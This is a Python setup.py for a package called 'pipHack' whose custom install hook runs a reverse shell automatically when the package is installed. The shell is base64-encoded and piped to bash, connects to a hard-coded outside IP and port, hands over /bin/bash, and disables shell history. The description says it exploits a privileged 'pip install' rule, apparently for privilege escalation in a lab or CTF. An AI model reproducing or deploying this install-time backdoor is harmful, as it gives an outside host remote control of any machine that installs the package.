from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
    def run(self):
        install.run(self)
        LHOST = '82.157.252.61'  # change this
        LPORT = 2333

        reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(
            LHOST=LHOST, LPORT=LPORT)
        encoded = base64.b64encode(reverse_shell)
        os.system('echo %s|base64 -d|bash' % encoded)


setup(
    name='pipHack',
    version='0.0.1',
    description='This will exploit a vuln to /usr/bin/pip install *',
    url='https://github.com/Zeroc0077/pipHack',
    author='zeroc',
    license='MIT',
    zip_safe=False,
    cmdclass={'install': CustomInstall}
)
